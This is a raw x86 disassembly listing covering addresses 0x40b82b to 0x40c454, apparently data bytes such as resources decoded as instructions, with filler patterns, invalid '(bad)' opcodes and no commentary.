  40b82b:	mov    esi,0xbc999ebe
  40b830:	mov    esp,0xbcbcbcbc
  40b835:	mov    esp,0x7fbebe65
  40b83a:	stos   BYTE PTR es:[edi],al
  40b83b:	mov    ds:0x97608667,eax
  40b840:	mov    ds:0xbebe4599,eax
  40b845:	gs cdq 
  40b847:	mov    esp,0xbcbcbcbc
  40b84c:	mov    esp,0xbebe65bc
  40b851:	dec    edi
  40b852:	mov    esp,DWORD PTR [edx-0x75e99884]
  40b858:	cdq    
  40b859:	cs xor eax,0x9965bebe
  40b85f:	mov    esp,0xbcbcbcbc
  40b864:	mov    esp,0xbebe65bc
  40b869:	mov    esi,0xa31c9c25
  40b86e:	mov    ds:0xbe4eb299,eax
  40b873:	mov    esi,0x999965be
  40b878:	cdq    
  40b879:	cdq    
  40b87a:	cdq    
  40b87b:	cdq    
  40b87c:	cdq    
  40b87d:	cdq    
  40b87e:	ja     0x40b83e
  40b880:	mov    esi,0x8b25bebe
  40b885:	stos   BYTE PTR es:[edi],al
  40b886:	xor    dh,BYTE PTR [esi+0x25]
  40b889:	mov    esi,0x65bebebe
  40b88e:	ja     0x40b907
  40b890:	ja     0x40b909
  40b892:	ja     0x40b90b
  40b894:	ja     0x40b8fb
  40b896:	mov    ebx,0xbebebebe
  40b89b:	mov    esi,0xb18e7faf
  40b8a0:	mov    esi,0xbebebebe
  40b8a5:	mov    esi,0xbebebebe
  40b8aa:	mov    esi,0xbebebebe
  40b8af:	mov    esi,0xbebebebe
  40b8b4:	mov    esi,0xbebebebe
  40b8b9:	mov    esi,0xbebebebe
  40b8be:	mov    esi,0xbebebebe
  40b8c3:	mov    esi,0xbebebebe
  40b8c8:	lock (bad) 
  40b8ca:	inc    DWORD PTR [eax]
  40b8cc:	loopne 0x40b94d
  40b8ce:	jecxz  0x40b8d0
  40b8d0:	sar    BYTE PTR [edi],0xc3
  40b8d3:	add    BYTE PTR [eax-0x7fff38e5],al
  40b8d9:	sbb    DWORD PTR [edi-0x70e78000],eax
  40b8df:	add    BYTE PTR [eax-0x3ffff0e8],al
  40b8e5:	cmp    BYTE PTR [edi],bl
  40b8e7:	add    al,ah
  40b8e9:	js     0x40b8ec
  40b8eb:	add    al,dh
  40b8ed:	clc    
  40b8ee:	add    eax,DWORD PTR [eax]
  40b8f0:	(bad)  
  40b8f1:	clc    
  40b8f2:	pop    es
  40b8f3:	add    bh,bh
  40b8f5:	clc    
  40b8f6:	(bad)  
  40b8f8:	(bad)  
  40b8f9:	clc    
  40b8fa:	pop    ds
  40b8fb:	add    al,dh
  40b8fd:	clc    
  40b8fe:	aas    
  40b8ff:	add    al,ah
  40b901:	js     0x40b904
  40b903:	add    al,al
  40b905:	cmp    BYTE PTR [ecx],al
  40b907:	add    BYTE PTR [eax-0x7ffffee8],al
  40b90d:	sbb    BYTE PTR [ecx],al
  40b90f:	add    BYTE PTR [eax-0x7ffffee8],al
  40b915:	sbb    BYTE PTR [ecx],al
  40b917:	add    al,al
  40b919:	cmp    BYTE PTR [ecx],al
  40b91b:	add    al,ah
  40b91d:	js     0x40b920
  40b91f:	add    al,dh
  40b921:	(bad)  
  40b922:	inc    DWORD PTR [eax]
  40b924:	(bad)  
  40b925:	(bad)  
  40b926:	inc    DWORD PTR [eax]
  40b928:	sub    BYTE PTR [eax],al
  40b92a:	add    BYTE PTR [eax],al
  40b92c:	adc    al,0x0
  40b92e:	add    BYTE PTR [eax],al
  40b930:	sub    BYTE PTR [eax],al
  40b932:	add    BYTE PTR [eax],al
  40b934:	add    DWORD PTR [eax],eax
  40b936:	or     BYTE PTR [eax],al
  40b938:	add    BYTE PTR [eax],al
  40b93a:	add    BYTE PTR [eax],al
  40b93c:	nop
  40b93d:	add    DWORD PTR [eax],eax
	...
  40b947:	add    BYTE PTR [eax],al
  40b949:	add    DWORD PTR [eax],eax
  40b94b:	add    BYTE PTR [eax],al
  40b94d:	add    DWORD PTR [eax],eax
  40b94f:	add    BYTE PTR [eax],al
  40b951:	add    BYTE PTR [eax],al
  40b953:	add    BYTE PTR [edi-0x62ffc395],dl
  40b959:	jp     0x40b9ae
  40b95b:	add    BYTE PTR [eax-0x55ffb68b],ah
  40b961:	jg     0x40b9b8
  40b963:	add    BYTE PTR [ecx+0x2000587f],ah
  40b969:	lahf   
  40b96a:	and    al,BYTE PTR [eax]
  40b96c:	aaa    
  40b96d:	mov    ch,0x3a
  40b96f:	add    BYTE PTR [eax],bh
  40b971:	mov    ch,0x3a
  40b973:	add    BYTE PTR [ecx-0x32],bl
  40b976:	pop    esp
  40b977:	add    BYTE PTR [edx-0x59ffa27d],ch
  40b97d:	xchg   DWORD PTR [eax+eax*1-0x57],esp
  40b981:	lea    ebp,[eax+eax*1-0x4d]
  40b985:	nop
  40b986:	ins    DWORD PTR es:[edi],dx
  40b987:	add    BYTE PTR [ebp-0x4bff916f],dh
  40b98d:	xchg   ebp,eax
  40b98e:	jne    0x40b990
  40b990:	mov    edx,0xbe007194
  40b995:	xchg   esp,eax
  40b996:	jo     0x40b998
  40b998:	mov    dh,0x9a
  40b99a:	jge    0x40b99c
  40b99c:	rcr    DWORD PTR [edi-0x6148ff81],0x82
  40b9a3:	add    BYTE PTR [ebx-0x4aff7b63],dh
  40b9a9:	lahf   
  40b9aa:	test   BYTE PTR [eax],al
  40b9ac:	mov    esp,0xb400809f
  40b9b1:	mov    al,ds:0xa1b60086
  40b9b6:	mov    BYTE PTR [eax],al
  40b9b8:	mov    ebx,0xbc0089a3
  40b9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9be:	mov    al,BYTE PTR [eax]
  40b9c0:	mov    ebx,0xbd008ca5
  40b9c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9c6:	mov    es,WORD PTR [eax]
  40b9c8:	mov    edi,0xba008da8
  40b9cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9ce:	xchg   edx,eax
  40b9cf:	add    BYTE PTR [esi-0x40ff504e],bh
  40b9d5:	mov    ah,0xb2
  40b9d7:	add    bl,al
  40b9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9da:	xchg   DWORD PTR [eax],eax
  40b9dc:	shl    BYTE PTR [esi-0x582fff75],0x87
  40b9e3:	add    bh,dl
  40b9e5:	scas   al,BYTE PTR es:[edi]
  40b9e6:	pop    DWORD PTR [eax]
  40b9e8:	ret    
  40b9e9:	lods   eax,DWORD PTR ds:[esi]
  40b9ea:	xchg   esi,eax
  40b9eb:	add    ah,al
  40b9ed:	lods   eax,DWORD PTR ds:[esi]
  40b9ee:	xchg   ebp,eax
  40b9ef:	add    cl,al
  40b9f1:	lods   eax,DWORD PTR ds:[esi]
  40b9f2:	call   0xc300:0x92afd700
  40b9f9:	mov    cl,0x9c
  40b9fb:	add    cl,cl
  40b9fd:	mov    cl,0x99
  40b9ff:	add    bl,cl
  40ba01:	mov    ch,0x9e
  40ba03:	add    bh,bl
  40ba05:	mov    ecx,0xb6c5009e
  40ba0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba0b:	add    bl,al
  40ba0d:	mov    eax,0xb9c600a2
  40ba12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba13:	add    bh,al
  40ba15:	mov    esp,0xbacb00a7
  40ba1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba1b:	add    ah,al
  40ba1d:	mov    bh,0xae
  40ba1f:	add    bh,al
  40ba21:	mov    ebx,0xbcc700ab
  40ba26:	stos   DWORD PTR es:[edi],eax
  40ba27:	add    ch,al
  40ba29:	mov    esp,0xbdc800ad
  40ba2e:	test   al,0x0
  40ba30:	int    0xbd
  40ba32:	stos   BYTE PTR es:[edi],al
  40ba33:	add    dl,cl
  40ba35:	mov    esi,0xbfce00ae
  40ba3a:	lods   eax,DWORD PTR ds:[esi]
  40ba3b:	add    al,dl
  40ba3d:	mov    edi,0xbbe300ac
  40ba42:	mov    al,ds:0xa4bfe700
  40ba47:	add    BYTE PTR [eax-0x65ff7e3f],al
  40ba4d:	into   
  40ba4e:	popf   
  40ba4f:	add    BYTE PTR [ebp-0x58ff6130],bl
  40ba55:	fldcw  WORD PTR [edx-0x401d4500]
  40ba5b:	add    bl,cl
  40ba5d:	shr    BYTE PTR [ebx-0x503f3400],0x0
  40ba64:	rol    al,1
  40ba66:	scas   al,BYTE PTR es:[edi]
  40ba67:	add    dh,cl
  40ba69:	ret    0xb0
  40ba6c:	into   
  40ba6d:	enter  0xbd,0xd1
  40ba71:	ret    
  40ba72:	mov    cl,0x0
  40ba74:	rol    ch,cl
  40ba76:	mov    bl,0x0
  40ba78:	rol    edi,cl
  40ba7a:	mov    bh,0x0
  40ba7c:	aam    0xc8
  40ba7e:	mov    ecx,0xbbcbda00
  40ba83:	add    cl,bl
  40ba85:	retf   
  40ba86:	mov    esp,0xbeccd900
  40ba8b:	add    bh,ah
  40ba8d:	shl    BYTE PTR [esi-0x4f371300],0x0
  40ba94:	not    ebx
  40ba96:	mov    ebp,0xc4cad400
  40ba9b:	add    dl,bl
  40ba9d:	into   
  40ba9e:	rol    BYTE PTR [eax],0xd3
  40baa1:	retf   
  40baa2:	leave  
  40baa3:	add    dl,bl
  40baa5:	rol    dl,1
  40baa7:	add    ch,dl
  40baa9:	ror    bl,cl
  40baab:	add    ch,bl
  40baad:	aad    0xca
  40baaf:	add    ch,bl
  40bab1:	(bad)  
  40bab2:	aam    0x0
  40bab4:	(bad)  
  40bab6:	aad    0x0
  40bab8:	jmp    0x40ba8c
  40baba:	rol    DWORD PTR [eax],0xe1
  40babd:	fmul   st,st(5)
  40babf:	add    cl,bh
  40bac1:	fcmove st,st(1)
  40bac3:	add    bl,ah
  40bac5:	fcmovbe st,st(0)
  40bac7:	add    ch,ah
  40bac9:	fst    st(3)
  40bacb:	add    dh,ah
  40bacd:	(bad)  
  40bacf:	add    al,ch
  40bad1:	(bad)  
  40bad3:	add    dh,bl
  40bad5:	jmp    0x40bab3
  40bad7:	add    cl,ch
  40bad9:	loopne 0x40bab2
  40badb:	add    al,ah
  40badd:	loope  0x40babd
  40badf:	add    ah,ch
  40bae1:	out    0xde,al
  40bae3:	add    dl,bh
  40bae5:	in     eax,0xd9
  40bae7:	add    bh,ah
  40bae9:	loop   0x40bacb
  40baeb:	add    ah,ah
  40baed:	out    0xe4,al
  40baef:	add    bl,ah
  40baf1:	in     al,dx
  40baf2:	out    0x0,eax
  40baf4:	out    0xee,eax
  40baf6:	out    0x0,al
  40baf8:	in     eax,0xe9
  40bafa:	jmp    0xea2ba2ff
  40baff:	add    dl,ch
  40bb01:	in     eax,dx
  40bb02:	in     eax,dx
  40bb03:	add    ch,ch
  40bb05:	out    dx,eax
  40bb06:	out    dx,al
  40bb07:	add    al,dh
  40bb09:	in     eax,dx
  40bb0a:	jmp    0xea00:0xe7f0eb00
  40bb11:	icebp  
  40bb12:	call   0xe931a717
  40bb17:	add    bh,ch
  40bb19:	icebp  
  40bb1a:	out    dx,eax
  40bb1b:	add    dl,dh
  40bb1d:	icebp  
  40bb1e:	out    dx,eax
  40bb1f:	add    ah,dh
  40bb21:	repnz out dx,eax
  40bb23:	add    bl,bh
  40bb25:	lock jmp 0xec00:0xe9f0fc00
  40bb2d:	lock lock add dl,dh
  40bb31:	repnz lock add ch,dh
  40bb35:	cmc    
  40bb36:	repz add ah,dh
  40bb39:	div    ch
  40bb3b:	add    bl,bh
  40bb3d:	div    esp
  40bb3f:	add    bl,bh
  40bb41:	clc    
  40bb42:	test   BYTE PTR [eax],0x0
	...
  40bd49:	add    BYTE PTR [eax],al
  40bd4b:	add    bh,bh
  40bd4d:	(bad)  
  40bd4e:	inc    DWORD PTR [eax]
  40bd50:	add    BYTE PTR [eax],al
  40bd52:	add    BYTE PTR [eax+0x1b],cl
  40bd55:	push   ds
  40bd56:	dec    eax
	...
  40bd63:	add    BYTE PTR [eax],al
  40bd65:	add    BYTE PTR [ebx+0x48],cl
  40bd68:	outs   dx,BYTE PTR ds:[esi]
  40bd69:	je     0x40bdbe
  40bd6b:	push   ebx
	...
  40bd74:	add    al,0x1
  40bd76:	add    BYTE PTR [eax],al
  40bd78:	add    BYTE PTR [ebx+0x44],cl
  40bd7b:	js     0x40bdf5
  40bd7d:	js     0x40bdf7
  40bd7f:	pop    ebp
  40bd80:	push   ebx
  40bd81:	add    BYTE PTR [eax],al
  40bd83:	add    BYTE PTR [eax],al
  40bd85:	add    BYTE PTR [eax],al
  40bd87:	add    DWORD PTR [edx+eiz*1],edi
  40bd8a:	add    BYTE PTR [eax],al
  40bd8c:	add    BYTE PTR [ecx],bl
  40bd8e:	arpl   WORD PTR [edi+0x77],si
  40bd91:	js     0x40be0e
  40bd93:	je     0x40bdc7
  40bd95:	add    BYTE PTR [eax],al
  40bd97:	add    al,BYTE PTR [eax]
  40bd99:	add    BYTE PTR [eiz*1+0x24],ch
  40bda0:	add    BYTE PTR ds:0x776c6c6b,dl
  40bda6:	js     0x40be20
  40bda8:	inc    esi
  40bda9:	add    BYTE PTR [eax],al
  40bdab:	or     dl,BYTE PTR [ebx]
  40bdad:	add    BYTE PTR ds:0x173c,al
  40bdb3:	add    BYTE PTR [eax],al
  40bdb5:	sub    al,BYTE PTR [edi+0x6c]
  40bdb8:	ins    BYTE PTR es:[edi],dx
  40bdb9:	ja     0x40be32
  40bdbb:	bound  esi,QWORD PTR [edx]
  40bdbd:	add    BYTE PTR [eax],al
  40bdbf:	or     eax,0x294f105c
  40bdc4:	sub    al,0x0
  40bdc6:	add    BYTE PTR [eax],al
  40bdc8:	add    BYTE PTR [eax],al
  40bdca:	cs push esi
  40bdcc:	imul   ebx,DWORD PTR [bx+di+0x48],0x0
  40bdd1:	add    BYTE PTR [eax],al
  40bdd3:	pcmpgtw mm3,QWORD PTR [ecx+edx*2+0xd]
  40bdd8:	add    BYTE PTR [eax],al
  40bdda:	add    BYTE PTR [eax],al
  40bddc:	add    BYTE PTR [eax],al
  40bdde:	add    BYTE PTR [eax],dh
  40bde0:	xor    al,0x39
  40bde2:	inc    esp
  40bde3:	add    BYTE PTR [eax],al
  40bde5:	add    BYTE PTR [eax],al
  40bde7:	adc    dh,BYTE PTR [esi+0x65]
  40bdea:	pop    esp
  40bdeb:	push   eax
  40bdec:	adc    BYTE PTR [ebx],al
  40bdee:	sbb    eax,DWORD PTR [eax]
	...
  40bdf8:	add    BYTE PTR [eax],al
  40bdfa:	add    BYTE PTR ds:0x5c65767b,dl
  40be00:	sub    eax,0x2c
	...
  40be0d:	add    BYTE PTR [eax],al
  40be0f:	sbb    edi,DWORD PTR [esp+edi*2+0x76]
  40be13:	pop    edx
  40be14:	and    eax,DWORD PTR [eax]
	...
  40be22:	add    BYTE PTR [ebx],bl
  40be24:	jl     0x40bea2
  40be26:	sbb    eax,DWORD PTR fs:[eax]
  40be29:	add    BYTE PTR [eax],al
  40be2b:	add    BYTE PTR [eax],al
  40be2d:	add    BYTE PTR [eax],al
  40be2f:	inc    esp
  40be30:	cmp    DWORD PTR [ebx],edi
  40be32:	dec    eax
  40be33:	add    BYTE PTR [eax],al
  40be35:	add    BYTE PTR [eax],al
  40be37:	sbb    edi,DWORD PTR [esi+ebx*2+0xb]
  40be3b:	add    BYTE PTR [eax],al
  40be3d:	add    BYTE PTR [eax],al
  40be3f:	add    BYTE PTR [eax],al
  40be41:	add    BYTE PTR [esi+0x57],al
  40be44:	je     0x40beb5
  40be46:	bound  edx,QWORD PTR [ebp+0x0]
  40be49:	add    BYTE PTR [eax],al
  40be4b:	sbb    ebx,DWORD PTR [esi+0x32]
  40be4e:	cmp    edx,DWORD PTR [ebx+0x53]
  40be51:	push   ebx
  40be52:	daa    
  40be53:	add    BYTE PTR [eax],al
  40be55:	xor    BYTE PTR [ebx+0x6f],cl
  40be58:	inc    eax
  40be59:	ds popa 
  40be5b:	pusha  
  40be5c:	dec    eax
  40be5d:	add    BYTE PTR [eax],al
  40be5f:	or     al,0x15
  40be61:	xor    edx,DWORD PTR [esp+edx*2+0x54]
  40be65:	push   esp
  40be66:	daa    
  40be67:	add    BYTE PTR [eax],al
  40be69:	push   ss
  40be6a:	ins    BYTE PTR es:[edi],dx
  40be6b:	inc    ecx
  40be6c:	or     BYTE PTR [esi],al
  40be6e:	outs   dx,DWORD PTR ds:[esi]
  40be70:	inc    ebp
  40be71:	add    BYTE PTR [eax],al
  40be73:	adc    eax,0x21212054
  40be78:	and    BYTE PTR [ecx],ah
  40be7a:	pop    ds
  40be7b:	add    BYTE PTR [eax],al
  40be7d:	push   ss
  40be7e:	arpl   WORD PTR [edx+0x9],ax
  40be81:	pop    es
  40be82:	aas    
  40be83:	js     0x40bebe
  40be85:	add    BYTE PTR [eax],al
  40be87:	cmp    ebx,DWORD PTR [eax+0x20]
  40be8a:	and    DWORD PTR [ecx],esp
  40be8c:	and    DWORD PTR [ecx],esp
  40be8e:	pop    ds
  40be8f:	add    BYTE PTR [eax],al
  40be91:	xor    BYTE PTR [eax+ebp*2],dh
  40be94:	inc    edx
  40be95:	inc    ecx
  40be96:	push   0x395d
  40be9b:	xor    ah,BYTE PTR [esp+edx*2+0x54]
  40be9f:	push   esp
  40bea0:	push   esp
  40bea1:	push   esp
  40bea2:	sub    BYTE PTR [eax],al
  40bea4:	add    BYTE PTR [eax],al
  40bea6:	xor    BYTE PTR [ebx+eiz*2],dh
  40bea9:	ins    BYTE PTR es:[edi],dx
  40beaa:	dec    ebx
  40beab:	inc    esp
  40beac:	add    BYTE PTR [eax],al
  40beae:	add    BYTE PTR [edi],ah
  40beb0:	push   ebx
  40beb1:	push   ebx
  40beb2:	push   ebx
  40beb3:	push   ebx
  40beb4:	push   ebx
  40beb5:	push   ebx
  40beb6:	daa    
  40beb7:	add    BYTE PTR [eax],al
  40beb9:	add    BYTE PTR [eax],al
  40bebb:	xor    BYTE PTR [esi],dl
  40bebd:	push   ss
  40bebe:	cmp    DWORD PTR [eax],eax
	...
  40bee0:	loope  0x40bee1
  40bee2:	lock add al,al
  40bee5:	push   DWORD PTR [eax]
  40bee7:	add    BYTE PTR [eax-0x7fffcf82],al
  40beed:	ins    BYTE PTR es:[edi],dx
  40beee:	jo     0x40bef0
  40bef0:	and    BYTE PTR [eax+esi*2+0x0],0x80
  40bef5:	pusha  
  40bef6:	jo     0x40bef8
  40bef8:	shl    al,0xf0
  40befb:	add    cl,ah
  40befd:	loopne 0x40bf0f
  40beff:	add    bh,bh
  40bf01:	loopne 0x40bf33
  40bf03:	add    bh,bh
  40bf05:	loopne 0x40bf77
  40bf07:	add    bh,bh
  40bf09:	loopne 0x40befb
  40bf0b:	add    cl,ah
  40bf0d:	loope  0x40beff
  40bf0f:	add    al,al
  40bf11:	loopne 0x40bf23
  40bf13:	add    BYTE PTR [eax-0x7fffefa0],al
  40bf19:	pusha  
  40bf1a:	adc    BYTE PTR [eax],al
  40bf1c:	and    BYTE PTR [eax+0x10],0x0
  40bf20:	and    BYTE PTR [eax+0x10],0x0
  40bf24:	shl    al,0x10
  40bf27:	add    cl,ah
  40bf29:	push   eax
  40bf2b:	add    bh,bh
  40bf2d:	push   eax
  40bf2f:	add    BYTE PTR [eax],ch
  40bf31:	add    BYTE PTR [eax],al
  40bf33:	add    BYTE PTR [eax],dl
  40bf35:	add    BYTE PTR [eax],al
  40bf37:	add    BYTE PTR [eax],ah
  40bf39:	add    BYTE PTR [eax],al
  40bf3b:	add    BYTE PTR [ecx],al
  40bf3d:	add    BYTE PTR [eax],cl
  40bf3f:	add    BYTE PTR [eax],al
  40bf41:	add    BYTE PTR [eax],al
  40bf43:	add    BYTE PTR [eax],al
  40bf45:	add    DWORD PTR [eax],eax
	...
  40bf4f:	add    BYTE PTR [eax],al
  40bf51:	add    DWORD PTR [eax],eax
  40bf53:	add    BYTE PTR [eax],al
  40bf55:	add    DWORD PTR [eax],eax
  40bf57:	add    bl,al
  40bf59:	mov    ecx,0xc5d200a9
  40bf5e:	mov    dh,0x0
  40bf60:	fxch   st(4)
  40bf62:	mov    esp,0x5c81a200
  40bf67:	add    bh,cl
  40bf69:	ret    
  40bf6a:	mov    bl,0x0
  40bf6c:	sahf   
  40bf6d:	jg     0x40bfca
  40bf6f:	add    ch,bh
  40bf71:	std    
  40bf72:	std    
  40bf73:	add    cl,ah
  40bf75:	in     eax,0xe5
  40bf77:	add    cl,dh
  40bf79:	repz repz add dh,dh
  40bf7d:	div    edi
  40bf7f:	add    BYTE PTR [ebp-0x59ff9170],ch
  40bf85:	test   DWORD PTR [eax+0x0],esp
  40bf88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf89:	mov    ebp,DWORD PTR [ecx+0x0]
  40bf8c:	in     al,dx
  40bf8d:	out    dx,eax
  40bf8e:	out    dx,eax
  40bf8f:	add    BYTE PTR [esp+edi*2-0x6e50ffa9],bl
  40bf96:	jo     0x40bf98
  40bf98:	mov    ds:0xfe006687,eax
  40bf9d:	div    cl
  40bf9f:	add    ch,bh
  40bfa1:	cmc    
  40bfa2:	lock add BYTE PTR [ebx-0x6cffcc9e],cl
  40bfa9:	outs   dx,BYTE PTR ds:[esi]
  40bfaa:	inc    esp
  40bfab:	add    bl,ah
  40bfad:	out    0xe7,eax
  40bfaf:	add    BYTE PTR [esi-0x1ffd8a6],al
  40bfb5:	cli    
  40bfb6:	test   DWORD PTR [eax],0xfbfdff
  40bfbc:	cwde   
  40bfbd:	ja     0x40c00e
  40bfbf:	add    BYTE PTR [esi-0x6aff4c2a],ch
  40bfc5:	jo     0x40c00e
  40bfc7:	add    BYTE PTR [edx-0x43],bh
  40bfca:	ja     0x40bfcc
  40bfcc:	sti    
  40bfcd:	cld    
  40bfce:	cld    
  40bfcf:	add    BYTE PTR [esi-0x4fff763b],cl
  40bfd5:	xchg   ebx,eax
  40bfd6:	jae    0x40bfd8
  40bfd8:	(bad)
  40bfdc:	(bad)  
  40bfdd:	stc    
  40bfde:	test   DWORD PTR [eax],0xc7daf8
  40bfe4:	xchg   ecx,eax
  40bfe5:	imul   edi,DWORD PTR [edi],0x0
  40bfe8:	xchg   ebp,eax
  40bfe9:	leave  
  40bfea:	xchg   ecx,eax
  40bfeb:	add    bl,dh
  40bfed:	cmc    
  40bfee:	cmc    
  40bfef:	add    BYTE PTR [ebp-0x1ffc79b],cl
  40bff5:	stc    
  40bff6:	test   BYTE PTR [eax],0xfb
  40bff9:	in     al,dx
  40bffa:	jecxz  0x40bffc
  40bffc:	mov    fs,WORD PTR [esi+0x38]
  40bfff:	add    dl,bh
  40c001:	fmulp  st(6),st
  40c003:	add    BYTE PTR [ecx-0x68ffad88],bl
  40c009:	jne    0x40c058
  40c00b:	add    dl,al
  40c00d:	loope  0x40bfd4
  40c00f:	add    BYTE PTR [ebp-0x64ffa782],bl
  40c015:	jnp    0x40c06c
  40c017:	add    BYTE PTR [ebp-0x63ffb68f],dl
  40c01d:	jnp    0x40c075
  40c01f:	add    BYTE PTR [ecx-0x7aff5d56],bh
  40c025:	pop    eax
  40c026:	and    eax,0xeaf1fc00
  40c02b:	add    ch,bh
  40c02d:	repnz jmp 0xf800:0xfbfcff00
  40c035:	aad    0xc2
  40c037:	add    ch,bh
  40c039:	icebp  
  40c03a:	jmp    0x40c03c
  40c03c:	fsubr  st,st(6)
  40c03e:	fiadd  DWORD PTR [eax]
  40c040:	mov    al,ds:0xfb009ace
  40c045:	jecxz  0x40c01c
  40c047:	add    bh,ch
  40c049:	icebp  
  40c04a:	icebp  
  40c04b:	add    bl,bh
  40c04d:	call   0xf227c12e
  40c052:	jmp    0xe42dbc57
  40c057:	add    BYTE PTR [edx-0x76ffcfa0],cl
  40c05d:	pop    esi
  40c05e:	add    BYTE PTR cs:[eax-0x6effd3a4],cl
  40c065:	imul   eax,DWORD PTR [eax+0x0],0x5b
  40c069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c06a:	dec    ebx
  40c06b:	add    BYTE PTR [ebp-0x6fffd9a8],al
  40c071:	push   0x3d
  40c073:	add    BYTE PTR [ebx-0x30ffca9d],cl
  40c079:	out    0xd2,al
  40c07b:	add    BYTE PTR [edi-0x46ff4d4c],bh
  40c081:	popf   
  40c082:	jg     0x40c084
  40c084:	adc    BYTE PTR [ebp+0x21],0x0
  40c088:	(bad)  
  40c089:	(bad)  
  40c08a:	inc    DWORD PTR [eax]
	...
  40c358:	dec    ebp
  40c359:	dec    ebp
  40c35a:	dec    ebp
  40c35b:	dec    ebp
  40c35c:	dec    ebp
  40c35d:	dec    ebp
  40c35e:	dec    ebp
  40c35f:	dec    ebp
  40c360:	dec    ebp
  40c361:	dec    ebp
  40c362:	dec    ebp
  40c363:	dec    ebp
  40c364:	push   ss
  40c365:	push   ss
  40c366:	dec    ebp
  40c367:	dec    ebp
  40c368:	dec    ebp
  40c369:	dec    ebp
  40c36a:	dec    ebx
  40c36b:	cmovnp ecx,DWORD PTR [ebp+0x4d]
  40c36f:	dec    ebp
  40c370:	dec    ebp
  40c371:	dec    ebp
  40c372:	dec    ebp
  40c373:	inc    ecx
  40c374:	and    dh,BYTE PTR [edi]
  40c376:	push   ss
  40c377:	dec    ebp
  40c378:	dec    ebp
  40c379:	add    eax,DWORD PTR [ecx]
  40c37b:	push   es
  40c37c:	add    cl,BYTE PTR [ebx]
  40c37e:	dec    ebp
  40c37f:	dec    ebp
  40c380:	and    ecx,DWORD PTR [ebp+0x4d]
  40c383:	adc    ebp,DWORD PTR [edx]
  40c385:	inc    ecx
  40c386:	dec    ebp
  40c387:	dec    ebp
  40c388:	dec    ebx
  40c389:	add    al,0x8
  40c38b:	push   es
  40c38c:	push   es
  40c38d:	add    cl,BYTE PTR [ebx+0x4d]
  40c390:	adc    al,0x14
  40c392:	sub    DWORD PTR ds:0x4d4d413b,edi
  40c398:	or     edx,DWORD PTR ds:0x9083e15
  40c39e:	or     cl,BYTE PTR [ebp+0x1b]
  40c3a1:	adc    dl,BYTE PTR [edx]
  40c3a3:	aas    
  40c3a4:	adc    ecx,DWORD PTR [ebp+0x4d]
  40c3a7:	dec    ebp
  40c3a8:	dec    ebx
  40c3a9:	add    BYTE PTR ds:0x4b01083c,dl
  40c3af:	dec    ebp
  40c3b0:	sbb    eax,DWORD PTR [esi]
  40c3b2:	adc    dl,BYTE PTR [edx]
  40c3b4:	aas    
  40c3b5:	sub    DWORD PTR [ebx],edx
  40c3b7:	dec    ebp
  40c3b8:	dec    ebp
  40c3b9:	push   cs
  40c3ba:	add    BYTE PTR ds:0x4d4d0304,cl
  40c3c0:	push   cs
  40c3c1:	pop    ss
  40c3c2:	pop    ss
  40c3c3:	adc    dl,BYTE PTR [edx]
  40c3c5:	and    ecx,DWORD PTR [ebp+0x4d]
  40c3c8:	dec    ebp
  40c3c9:	dec    ebp
  40c3ca:	dec    ebx
  40c3cb:	or     al,0x4b
  40c3cd:	dec    ebp
  40c3ce:	dec    ebp
  40c3cf:	dec    ebp
  40c3d0:	push   cs
  40c3d1:	push   es
  40c3d2:	push   es
  40c3d3:	pop    ss
  40c3d4:	adc    al,0x4d
  40c3d6:	dec    ebp
  40c3d7:	dec    ebp
  40c3d8:	dec    ebp
  40c3d9:	dec    ebp
  40c3da:	dec    ebp
  40c3db:	dec    ebp
  40c3dc:	dec    ebp
  40c3dd:	dec    ebp
  40c3de:	dec    ebp
  40c3df:	dec    ebp
  40c3e0:	push   cs
  40c3e1:	push   es
  40c3e2:	push   es
  40c3e3:	sbb    DWORD PTR [ebp+0x4d],ecx
  40c3e6:	dec    ebp
  40c3e7:	dec    ebp
  40c3e8:	dec    ebp
  40c3e9:	dec    ebp
  40c3ea:	dec    ebx
  40c3eb:	cmovnp ecx,DWORD PTR [ebp+0x4d]
  40c3ef:	dec    ebp
  40c3f0:	add    eax,0x4d4d0e06
  40c3f5:	dec    ebp
  40c3f6:	dec    ebp
  40c3f7:	dec    ebp
  40c3f8:	dec    ebp
  40c3f9:	add    eax,DWORD PTR [ecx]
  40c3fb:	push   es
  40c3fc:	add    cl,BYTE PTR [ebx]
  40c3fe:	dec    ebp
  40c3ff:	dec    ebp
  40c400:	add    eax,0x4a4a1f05
  40c405:	dec    edx
  40c406:	dec    edx
  40c407:	dec    ebp
  40c408:	dec    ebx
  40c409:	add    al,0x48
  40c40b:	cmp    bh,BYTE PTR [ecx]
  40c40d:	add    cl,BYTE PTR [ebx+0x4d]
  40c410:	add    eax,0x49494932
  40c415:	dec    ecx
  40c416:	dec    edx
  40c417:	dec    ebp
  40c418:	or     edx,DWORD PTR ds:0x824441c
  40c41e:	cmovge ecx,DWORD PTR [edx+0x49]
  40c422:	dec    ecx
  40c423:	dec    ecx
  40c424:	dec    ecx
  40c425:	dec    ecx
  40c426:	dec    edx
  40c427:	dec    ebp
  40c428:	dec    ebx
  40c429:	add    BYTE PTR [edx],bl
  40c42b:	push   ds
  40c42c:	sub    eax,0x4a4d4b01
  40c431:	dec    ecx
  40c432:	dec    ecx
  40c433:	dec    ecx
  40c434:	dec    ecx
  40c435:	dec    ecx
  40c436:	dec    edx
  40c437:	dec    ebp
  40c438:	dec    ebp
  40c439:	push   cs
  40c43a:	add    BYTE PTR ds:0x4d4d0304,cl
  40c440:	dec    edx
  40c441:	dec    edx
  40c442:	dec    edx
  40c443:	dec    edx
  40c444:	dec    edx
  40c445:	dec    edx
  40c446:	dec    edx
  40c447:	dec    ebp
  40c448:	dec    ebp
  40c449:	dec    ebp
  40c44a:	dec    ebx
  40c44b:	or     al,0x4b
  40c44d:	dec    ebp
  40c44e:	dec    ebp
  40c44f:	dec    ebp
  40c450:	dec    ebp
  40c451:	dec    ebp
  40c452:	dec    ebp
  40c453:	dec    ebp
  40c454:	dec    ebp
